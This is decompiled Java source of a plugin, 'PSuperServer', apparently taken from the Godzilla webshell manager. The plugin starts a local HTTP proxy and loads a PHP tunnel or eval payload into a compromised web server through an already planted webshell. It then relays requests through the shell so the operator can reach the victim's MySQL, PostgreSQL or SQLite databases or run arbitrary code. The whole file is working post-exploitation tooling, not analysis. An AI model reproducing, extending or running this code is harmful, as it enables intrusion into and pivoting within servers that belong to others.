/*     */ package shells.plugins.php;
/*     */ 
/*     */ import com.httpProxy.server.CertPool;
/*     */ import com.httpProxy.server.core.HttpProxyHandle;
/*     */ import com.httpProxy.server.core.HttpProxyServer;
/*     */ import com.httpProxy.server.request.HttpRequest;
/*     */ import com.httpProxy.server.request.HttpRequestParameter;
/*     */ import com.httpProxy.server.response.HttpResponse;
/*     */ import com.httpProxy.server.response.HttpResponseHeader;
/*     */ import com.httpProxy.server.response.HttpResponseStatus;
/*     */ import core.ApplicationContext;
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import java.net.InetAddress;
/*     */ import java.net.Socket;
/*     */ import java.util.HashMap;
/*     */ import java.util.Iterator;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "PSuperServer", DisplayName = "超级服务")
/*     */ public class PSuperServer
/*     */   implements Plugin, HttpProxyHandle
/*     */ {
/*  44 */   private static final String[] PAYLOADS = new String[] { "ntunnel_mysql", "ntunnel_pgsql", "ntunnel_sqlite", "eval" };
/*     */   
/*  46 */   private String CLASS_NAME = "ntunnel_mysql";
/*     */   
/*     */   private final JPanel panel;
/*     */   
/*     */   private final RTextArea tipTextArea;
/*     */   private final JButton stopButton;
/*     */   private final JButton startButton;
/*     */   private final JComboBox<String> payloadComboBox;
/*     */   private final JLabel hostLabel;
/*     */   private final JLabel portLabel;
/*     */   private final JLabel payloadLabel;
/*     */   private final JTextField hostTextField;
/*     */   private final JTextField portTextField;
/*     */   private final JSplitPane httpProxySplitPane;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   private HttpProxyServer httpProxyServer;
/*     */   
/*     */   public PSuperServer() {
/*  67 */     this.panel = new JPanel(new BorderLayout());
/*     */     
/*  69 */     this.hostLabel = new JLabel("host :");
/*  70 */     this.portLabel = new JLabel("port :");
/*  71 */     this.startButton = new JButton("Start");
/*  72 */     this.stopButton = new JButton("Stop");
/*  73 */     this.payloadLabel = new JLabel("Payload");
/*  74 */     this.hostTextField = new JTextField("127.0.0.1", 15);
/*  75 */     this.portTextField = new JTextField("8080", 7);
/*  76 */     this.tipTextArea = new RTextArea();
/*  77 */     this.httpProxySplitPane = new JSplitPane();
/*  78 */     this.payloadComboBox = new JComboBox<>(PAYLOADS);
/*     */     
/*  80 */     this.httpProxySplitPane.setOrientation(0);
/*  81 */     this.httpProxySplitPane.setDividerSize(0);
/*     */     
/*  83 */     this.tipTextArea.append("Logs:\r\n");
/*     */     
/*  85 */     JPanel httpProxyTopPanel = new JPanel();
/*  86 */     httpProxyTopPanel.add(this.hostLabel);
/*  87 */     httpProxyTopPanel.add(this.hostTextField);
/*  88 */     httpProxyTopPanel.add(this.portLabel);
/*  89 */     httpProxyTopPanel.add(this.portTextField);
/*  90 */     httpProxyTopPanel.add(this.payloadLabel);
/*  91 */     httpProxyTopPanel.add(this.payloadComboBox);
/*  92 */     httpProxyTopPanel.add(this.startButton);
/*  93 */     httpProxyTopPanel.add(this.stopButton);
/*     */     
/*  95 */     this.httpProxySplitPane.setTopComponent(httpProxyTopPanel);
/*  96 */     this.httpProxySplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));
/*     */     
/*  98 */     this.panel.add(this.httpProxySplitPane);
/*     */   }
/*     */ 
/*     */   
/*     */   private void Load() {
/* 103 */     this.CLASS_NAME = (String)this.payloadComboBox.getSelectedItem();
/*     */     try {
/* 105 */       InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.php", new Object[] { this.CLASS_NAME }));
/* 106 */       byte[] data = functions.readInputStream(inputStream);
/* 107 */       inputStream.close();
/* 108 */       if (this.payload.include(this.CLASS_NAME, data)) {
/* 109 */         this.loadState = true;
/* 110 */         Log.log("Load success", new Object[0]);
/* 111 */         this.tipTextArea.append("Load success\r\n");
/*     */       } else {
/* 113 */         Log.error("Load fail");
/* 114 */         this.tipTextArea.append("Load fail\r\n");
/*     */       } 
/* 116 */     } catch (Exception e) {
/* 117 */       Log.error(e);
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public void handler(Socket clientSocket, HttpRequest httpRequest) throws Exception {
/* 125 */     httpRequest.getHttpRequestHeader().setHeader("Connection", "close");
/*     */     
/* 127 */     ReqParameter reqParameter = new ReqParameter();
/*     */     
/* 129 */     handlerReq(reqParameter, httpRequest);
/*     */     
/* 131 */     byte[] result = this.payload.evalFunc(this.CLASS_NAME, "xxxxx", reqParameter);
/*     */     
/* 133 */     HttpResponse httpResponse = new HttpResponse(new HttpResponseStatus(200), new HttpResponseHeader(), result);
/*     */     
/* 135 */     httpResponse.getHttpResponseHeader().setHeader("Connection", "close");
/*     */     
/* 137 */     clientSocket.getOutputStream().write(httpResponse.encode());
/*     */   }
/*     */   
/*     */   private void handlerReq(ReqParameter reqParameter, HttpRequest httpRequest) {
/* 141 */     String type = httpRequest.getHttpRequestHeader().getHeader("Content-Type");
/* 142 */     type = (type == null) ? httpRequest.getHttpRequestHeader().getHeader("Content-type") : type;
/* 143 */     type = (type == null) ? httpRequest.getHttpRequestHeader().getHeader("content-type") : type;
/* 144 */     HttpRequestParameter httpRequestParameter = new HttpRequestParameter();
/* 145 */     if (type == null || httpRequest.getRequestData() == null || (httpRequest.getRequestData()).length == 0) {
/*     */       return;
/*     */     }
/* 148 */     type = type.trim();
/*     */ 
/*     */     
/* 151 */     if (type.indexOf("x-www-form") != -1) {
/* 152 */       httpRequestParameter.decode(httpRequest.getRequestData());
/* 153 */       httpRequestParameter.add("isUrlDecode", Boolean.valueOf(true));
/* 154 */     } else if (type.indexOf("multipart") != -1) {
/* 155 */       httpRequestParameter.setMultipart(true);
/* 156 */       int index = type.indexOf("boundary=");
/* 157 */       if (index != -1) {
/* 158 */         index += "boundary=".length();
/* 159 */         int endIndex = type.indexOf(";", index);
/* 160 */         endIndex = (endIndex == -1) ? type.length() : endIndex;
/* 161 */         String boundaryString = type.substring(index, endIndex);
/* 162 */         httpRequestParameter.setBoundary(boundaryString);
/* 163 */         httpRequestParameter.decode(httpRequest.getRequestData());
/*     */       } 
/*     */     } else {
/* 166 */       reqParameter.add("requestData", httpRequest.getRequestData());
/*     */     } 
/* 168 */     httpRequestParameter.decodeByUrl(httpRequest.getUrl());
/* 169 */     httpRequestParameter.add("REQUEST_METHOD", httpRequest.getMethod());
/* 170 */     HashMap<String, byte[]> parameterHashMap = httpRequestParameter.getParameter();
/* 171 */     Iterator<String> iterator = parameterHashMap.keySet().iterator();
/* 172 */     while (iterator.hasNext()) {
/* 173 */       String keyString = iterator.next();
/* 174 */       byte[] value = parameterHashMap.get(keyString);
/* 175 */       reqParameter.add(keyString, value);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   private void startButtonClick(ActionEvent actionEvent) throws Exception {
/* 181 */     Load();
/* 182 */     if (this.httpProxyServer == null) {
/*     */       
/* 184 */       int listenPort = Integer.valueOf(this.portTextField.getText().trim()).intValue();
/* 185 */       InetAddress bindAddr = InetAddress.getByName(this.hostTextField.getText().trim());
/*     */ 
/*     */       
/* 188 */       CertPool certPool = new CertPool(ApplicationContext.getHttpsPrivateKey(), ApplicationContext.getHttpsCert());
/*     */       
/* 190 */       this.httpProxyServer = new HttpProxyServer(listenPort, 50, bindAddr, certPool, this);
/*     */       
/* 192 */       if (this.httpProxyServer.startup()) {
/* 193 */         this.tipTextArea.append(
/* 194 */             String.format("start! bindAddr: %s listenPort: %s\r\n", new Object[] { bindAddr.getHostAddress(), Integer.valueOf(listenPort) }));
/* 195 */         GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "正在启动!", "提示", 1);
/*     */       } else {
/* 197 */         this.httpProxyServer = null;
/* 198 */         GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "启动失败!", "提示", 1);
/*     */       } 
/*     */     } else {
/*     */       
/* 202 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "已启动!", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void stopButtonClick(ActionEvent actionEvent) {
/* 207 */     if (this.httpProxyServer == null) {
/* 208 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "没有启动!", "提示", 2);
/*     */     } else {
/* 210 */       this.httpProxyServer.setNextSocket(false);
/* 211 */       this.httpProxyServer.shutdown();
/* 212 */       this.httpProxyServer = null;
/* 213 */       this.tipTextArea.append("stop!\r\n");
/* 214 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "已停止!", "提示", 1);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 220 */     this.shellEntity = shellEntity;
/* 221 */     this.payload = this.shellEntity.getPayloadModule();
/* 222 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 223 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 230 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PSuperServer.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */